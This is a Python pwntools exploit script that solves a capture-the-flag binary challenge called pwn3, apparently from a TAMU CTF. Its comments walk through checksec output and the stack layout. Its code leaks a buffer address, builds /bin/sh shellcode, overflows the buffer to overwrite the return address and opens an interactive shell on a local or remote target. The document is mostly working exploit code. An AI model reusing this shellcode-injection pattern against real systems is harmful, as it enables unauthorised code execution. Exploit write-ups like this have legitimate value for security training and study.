from pwn import *

###############################################################################
# Evaluate File
###############################################################################

# There are no stack canary and NX is disabled...so we can execute on the stack
'''
$ checksec.sh pwn3.dms
checksec pwn3.dms 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
'''

###############################################################################
# Reverse binary
###############################################################################

'''
main called the "echo" function 
echo function 
  1. printf(location of the buffer)
  2. buffer = gets(user input)
  3. puts(buffer)
'''

###############################################################################
# Buffer layout
###############################################################################

'''
         +---------------+
ebp-0xee |/////buffer////|<------ overwrite with shellcode
         |///////////////|      |
         |///////////////|      |
         |///////////////|      | length = 0xee
         |///////////////|      |
         |///////////////|      |
         |///////////////|      |
         |///////////////|<------
         +---------------+      
ebp+0x00 |///saved_rbp///|
         +---------------+
ebp+0x04 |//////RIP//////|  Overwrite RIP to address(buffer)
         +---------------+
'''

###############################################################################
# Buffer overflow and set RIP
###############################################################################

def getConn(local=True):
  return process('./pwn3.dms') if local else remote('pwn.ctf.tamu.edu', 4323)

binary = ELF("pwn3.dms")

conn = getConn()

'''
Welcome to the New Echo application 2.0!
Changelog:
- Less deprecated flag printing functions!
- New Random Number Generator!

'''
print conn.recvline(),
print conn.recvline(),
print conn.recvline(),
print conn.recvline(),
print conn.recvline(),

# Read in address of the buffer
print conn.recvuntil("Your random number ")
buffer_address = p32(int(conn.recvline().strip()[:-1], 16))

# create shellcode for 32 bit
sc = shellcraft.linux.sh()
sca = asm(sc)
log.info("Using shellcode\n" + sc)
log.info(hexdump(sca))

# buffer length + saved_rbp
len_buffer = 0xee + 0x4

# payload = shellcode + 'A's + address(buffer)
payload = sca + 'A' * (len_buffer - len(sca)) + buffer_address

print conn.recv() # Now what should I echo?

conn.send(payload)

conn.interactive()
